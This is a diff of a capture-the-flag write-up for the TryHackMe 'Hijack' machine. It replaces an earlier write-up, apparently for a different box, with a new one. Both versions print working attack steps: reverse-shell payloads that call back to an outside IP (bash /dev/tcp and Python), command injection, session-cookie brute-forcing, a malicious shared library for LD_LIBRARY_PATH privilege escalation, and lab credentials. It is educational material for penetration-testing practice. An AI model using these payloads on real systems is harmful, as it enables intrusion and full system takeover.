@@ -1,235 +1,341 @@
 # Hijack - Writeup
 
-- **Machine Name:** Hijack
-- **Platform:** TryHackMe
-- **Difficulty:** Easy
+* **Machine Name:** Hijack
+* **Platform:** TryHackMe
+* **Difficulty:** Easy
+
+---
 
 ## Overview
 
+Hijack is an easy Linux machine that focuses on enumeration, credential discovery, and privilege escalation through shared library hijacking.
+The attack chain involves abusing an exposed NFS share, extracting credentials from multiple services, exploiting an insecure cookie authentication mechanism, and ultimately escalating privileges via **LD_LIBRARY_PATH hijacking** when running Apache with elevated permissions.
+
+---
+
 ## Attack Path
-1. Port Scanning with nmap
-2. RPC Mount access 
+
+1. Port scanning with Nmap
+2. Access exposed NFS share via RPC
+3. Retrieve FTP credentials
+4. Brute-force administrator cookie
+5. Achieve Remote Code Execution through command injection
+6. Reuse discovered credentials for lateral movement
+7. Escalate privileges using **LD_LIBRARY_PATH hijacking**
+
+---
 
 ## Enumeration
 
 ### Nmap Scan
-```bash
-$ nmap -sV -sC -T4 --vv -p 22,21,80,111,2049,44204,47743,51488 -o nmap_scan 10.67.189.191
-
-PORT      STATE SERVICE REASON         VERSION
-21/tcp    open  ftp     syn-ack ttl 62 vsftpd 3.0.3
-22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpnR3ykEuk2NQvQc0himxsomjasxw3O/GG4qFs6hsvMeL9Tz2XjphokcWL047dwd+nlJTunp4g3NIPNZ4fRM3Je/FhUcnOEN1r9lrqv8Nj5Z7W6ijggHOKF+TroSfIAY4lQqGj6mxH1v6x/KmaUYHeUzRc0CjiYambzDPWrMINP1Ystdzf0an4j6B019hNJqIZf0hqVE+85By1QB/2KkwHInr5NchKDDGjuORwK2aYia/y4OwtoXFN1bYEKo86ArmgPISJ1fiQvul9l8jp//LWQ6LP4CL0RazQpgVN0KYycjF9apiElB/wCbJmu46OJq+4MwAvNdZ0k9yKB851QCED
-|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFLpu0hiiZtLDcv/LyQ1ueZ+JwHOws+dcFw/ec/uzWAcwO26pPCBjZ8ChHD7Wucjfb8JOVVEG/BsSaAnunj7oGM=
-|   256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDB99YDzbOHshtveNLYuxSz88jXIuijXj8gyYVZx/Nn
-80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-title: Home
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-111/tcp   open  rpcbind syn-ack ttl 62 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
-|   100003  2,3,4       2049/udp   nfs
-|   100003  2,3,4       2049/udp6  nfs
-|   100005  1,2,3      42788/tcp6  mountd
-|   100005  1,2,3      44204/tcp   mountd
-|   100005  1,2,3      53651/udp6  mountd
-|   100005  1,2,3      53712/udp   mountd
-|   100021  1,3,4      37038/tcp   nlockmgr
-|   100021  1,3,4      37690/tcp6  nlockmgr
-|   100021  1,3,4      43488/udp   nlockmgr
-|   100021  1,3,4      60191/udp6  nlockmgr
-|   100227  2,3         2049/tcp   nfs_acl
-|   100227  2,3         2049/tcp6  nfs_acl
-|   100227  2,3         2049/udp   nfs_acl
-|_  100227  2,3         2049/udp6  nfs_acl
-2049/tcp  open  nfs     syn-ack ttl 62 2-4 (RPC #100003)
-44204/tcp open  mountd  syn-ack ttl 62 1-3 (RPC #100005)
-47743/tcp open  mountd  syn-ack ttl 62 1-3 (RPC #100005)
-51488/tcp open  mountd  syn-ack ttl 62 1-3 (RPC #100005)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-```
-
-Among the services, ftp (port 21), http (80) and rpc (111) stand out.
-Let's start mounting the rpc internal shares on our machine:
 
 ```bash
-$ mkdir mnt/nfs
-$ sudo mount 10.67.189.191:/ mnt/nfs
+nmap -sV -sC -T4 --vv -p 22,21,80,111,2049,44204,47743,51488 -o nmap_scan 10.67.189.191
 ```
 
-This way, we mount the "/" directory on the machine inside our "mnt/nfs" directory.
+The scan revealed several interesting services:
+
+* FTP on port **21**
+* SSH on port **22**
+* HTTP on port **80**
+* RPC/NFS services on ports **111** and **2049**
+
+The presence of RPC services suggested that **NFS shares might be exposed**, which became the next target for enumeration.
+
+---
+
+### RPC Enumeration
+
+To inspect the NFS share, the root directory of the target was mounted locally:
 
 ```bash
-$ ls -l share 
-ls: cannot open directory 'share': Permission denied
-                                                                                                       
-$ ls -la     
-total 12
-drwxr-xr-x  3 root root 4096 Aug  8  2023 .
-drwxr-xr-x 23 root root 4096 Mar 15 22:53 ..
-drwx------  2 1003 1003 4096 Aug  8  2023 share
+mkdir mnt/nfs
+sudo mount 10.67.189.191:/ mnt/nfs
 ```
 
-Infortunately, we don't have permission to access the share folder since just the user with uid 1003 has permissions. However, we can bypass this rule by creating a user with uid 1003 in our machine:
+Listing the mounted directory revealed the following:
 
 ```bash
-$ sudo useradd -m -u 1003 -s /bin/bash hijack
-$ sudo su hijack
+ls -la
 ```
 
-![RCP bypass](images/nmap_scan.png)
+```
+drwx------ 2 1003 1003 4096 Aug  8  2023 share
+```
+
+The `share` directory was owned by **UID 1003**, preventing access from the current user.
+
+However, this restriction could be bypassed by creating a local user with the same UID:
+
+```bash
+sudo useradd -m -u 1003 -s /bin/bash hijack
+sudo su hijack
+```
+
+After switching to the new user, the directory became accessible.
+
+![RPC bypass](img/bypassing_rpc.png)
+
+Inside the directory, a file containing FTP credentials was discovered:
+
+```
+ftp creds :
+
+ftpuser:W3stV1rg1n14M0un741nM4m4
+```
+
+---
+
+### FTP Enumeration
+
+Using the discovered credentials, access to the FTP service was obtained:
+
+```bash
+ftp 10.67.189.191
+```
+
+Two interesting files were retrieved:
+
+```
+.passwords_list.txt
+.from_admin.txt
+```
+
+The password list contained numerous candidate passwords, while the administrator note revealed important information:
+
+```
+To all employees, this is "admin" speaking,
+i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far.
+
+NOTE To rick : good job on limiting login attempts, it works like a charm.
+```
+
+This strongly suggested that one of these passwords was used by the administrator.
+
+---
 
 ### Web Enumeration
 
-After the scanning. I started a directory enumeration with gobuster:
-```bash
-gobuster dir -u http://10.64.179.44:12340 -w /usr/share/wordlists/dirb/big.txt --random-agent
-```
+Browsing the web application running on port **80**, a user account was created and authenticated successfully.
 
-A few minutes after, the command returned the ```/rms``` directory.
-This directory hosted a Restaurant Management System.
-## Vulnerability Analysis
+While inspecting the session cookie, an interesting pattern appeared. The `PHPSESSID` value was encoded in **Base64**.
 
-### Stored Cross-Site Scripting
-
-While testing the application, a stored Cross-Site Scripting (XSS) vulnerability was identified at the register functionality.
-It was possible to set your first name as a XSS Payload, such as: ```<img src=x onerror="alert(1)">```. This would trigger an alert when accessing your profile information.
-However, the XSS did not lead to session hijacking or further compromise and was not useful for exploitation.
-
-### Remote Code Execution
-
-Further research revealed that the application version was vulnerable to a known Remote Code Execution flaw:
+Example:
 
 ```bash
-searchsploit restaurant management system               
----------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                    |  Path
----------------------------------------------------------------------------------- ---------------------------------
-Restaurant Management System 1.0  - SQL Injection                                 | php/webapps/51330.txt
-Restaurant Management System 1.0 - Remote Code Execution                          | php/webapps/47520.py
----------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+echo 'am9objo0Mjk3ZjQ0YjEzOTU1MjM1MjQ1YjI0OTczOTlkN2E5Mw==' | base64 -d
 ```
+
+Result:
+
+```
+john:4297f44b13955235245b2497399d7a93
+```
+
+The password component was an **MD5 hash**, indicating that the session cookie followed the format:
+
+```
+username:md5(password)
+```
+
+This discovery made it possible to attempt **cookie brute-forcing** using the password list obtained from the FTP server.
+
+---
 
 ## Exploitation
 
-I set up a netcat listener:
+### Cookie Brute-Force
+
+First, the password list was converted to MD5 hashes:
 
 ```bash
-nc -lnvp 443
-listening on [any] 443 ...
+for p in $(cat .passwords_list.txt); do echo -n $p | md5sum | cut -d " " -f1; done
 ```
 
-I ran the exploit, which uploaded a malicious PHP file at: ```/images/reverse-shell.php```
+The results were saved to a file called:
 
-Then, I received a connection after injecting the following Python reverse shell payload: 
 ```
-export RHOST="192.168.136.51";export RPORT=555;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+md5_passwords.txt
 ```
+
+Next, the correct cookie format was constructed:
+
+```
+admin:<md5_hash>
+```
+
+Each entry was encoded using Base64:
+
+```bash
+for p in $(cat md5_passwords.txt); do echo -n "admin:$p" | base64; done
+```
+
+The resulting list was saved as:
+
+```
+admin_brute_wordlist
+```
+
+The brute-force was performed using **ffuf**:
+
+```bash
+ffuf -u http://10.67.189.191/index.php -H "Cookie: PHPSESSID=FUZZ" -w admin_brute_wordlist -fs 487 -s
+```
+
+The valid administrator cookie was identified:
+
+```
+YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
+```
+
+Replacing the session cookie with this value resulted in successful access to the administrator panel.
+
+---
+
+### Remote Code Execution
+
+Within the administrator panel, a feature called **“Services Status Checker”** was discovered.
+
+The input field was vulnerable to **command injection**, allowing the execution of arbitrary system commands using backticks.
+
+Example:
+
+```
+`cat /etc/passwd`
+```
+
+To gain a shell, a reverse shell payload was injected while listening locally:
+
+```bash
+nc -lvnp 443
+```
+
+Payload:
+
+```bash
+`/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.136.51/443 0>&1"`
+```
+
+This resulted in a successful reverse shell connection.
+
+---
 
 ## Post Exploitation
 
 ### Credential Discovery
 
-While enumerating the web directory, the following file was identified:
+While enumerating the web application files, the following configuration file was identified:
 
 ```
-/var/www/html/rms/connection/config.php
+/var/www/html/rms/config.php
 ```
 
-This file contained hardcoded database credentials:
+The file contained hardcoded credentials:
 
 ```
-root: veerUffIrangUfcubyig
+rick : N3v3rG0nn4G1v3Y0uUp
 ```
 
-### MySQL Access
+These credentials allowed switching to the user **rick**:
 
-The credentials were used to access the local MySQL service:
-
-```
-mysql -h 127.0.0.1 -u root -p
+```bash
+su rick
 ```
 
-Although access was successful, no useful information was found in the databases. Further privilege escalation was required.
+The user flag was then obtained:
+
+```
+/home/rick/user.txt
+```
+
+---
 
 ## Privilege Escalation
 
-### Local Enumeration
-
-After running linenum.sh, a sensitive file was found in:
-
-```
-/etc/fstab
-```
-
-This file contained a reusable password, which allowed escalation to the user edward.
-
-The user flag was retrieved from:
-
-```
-/home/edward/user.txt
-```
-
 ### Sudo Permissions
 
-Checking sudo privileges with ```sudo -l```, I discovered that we can run ```/usr/sbin/reboot``` with root privileges.
+Checking the sudo permissions revealed the following configuration:
 
-While limited, this permission became useful in combination with another misconfiguration.
+```bash
+sudo -l
+```
 
-### systemd Service Abuse
+```
+env_keep+=LD_LIBRARY_PATH
 
-Further enumeration with LinPEAS revealed thath we have write permissions on the following service file:
+User rick may run the following commands:
+(root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
 
-```/etc/systemd/system/zeno-monitoring.service```
+The key observation here is that the environment variable **LD_LIBRARY_PATH** was preserved when executing commands with sudo.
 
-I modified the original file by injecting a malicious payload into the ExecStart directive:
+This made it possible to perform **shared library hijacking**.
 
-```ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash'```
+---
 
-## Root Access
+### LD_LIBRARY_PATH Hijacking
 
-After modifying the service, the system was rebooted:
+First, the shared libraries used by Apache were identified:
 
-```sudo /usr/sbin/reboot```
+```bash
+ldd /usr/sbin/apache2
+```
 
-Once the system restarted, the reverse shell was re-established.
+Among them:
 
-The SUID bash binary was then executed:
+```
+libcrypt.so.1
+```
 
-```/home/edward/bash -p```
+A malicious shared library was created:
 
-This resulted in a root shell.
+```c
+#include <stdio.h>
+#include <stdlib.h>
 
-The root flag was obtained from:
+void main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+```
 
-```/root/root.txt```
+The library was compiled as:
+
+```bash
+gcc -shared -fPIC libpwn.c -o /tmp/libcrypt.so.1
+```
+
+Finally, Apache was executed with a controlled library path:
+
+```bash
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
+
+Because Apache was executed as root, it loaded the malicious library, resulting in a **root shell**.
+
+The final flag was retrieved from:
+
+```
+/root/root.txt
+```
+
+---
 
 ## Conclusion
 
-Even being a tough machine, it was a very fun to play with and I have leaned a lot from it. 
+This machine demonstrates how small misconfigurations across multiple services can be chained together to achieve full system compromise.
 
-This machine demonstrated the importance of:
+The attack began with the exposure of an NFS share, which allowed the discovery of FTP credentials. Information obtained from the FTP service was then leveraged to brute-force an insecure cookie authentication mechanism, granting administrative access to the web application. From there, a command injection vulnerability enabled remote code execution.
 
-- Keeping web applications up to date
-- Avoiding writable systemd service files
-- Restricting sudo permissions
+Finally, privilege escalation was achieved through **LD_LIBRARY_PATH hijacking**, exploiting the fact that the Apache service could be executed with elevated privileges while preserving attacker-controlled environment variables.
 
-The exploitation chain combined a known RCE vulnerability with poor system configuration to achieve full system compromise.
+This challenge highlights the importance of:
 
+* Properly restricting access to NFS shares
+* Avoiding predictable or shared password lists
+* Securing session management mechanisms
+* Preventing command injection vulnerabilities
+* Restricting environment variables when using sudo
+
+Together, these weaknesses formed a complete exploitation chain leading to root access.
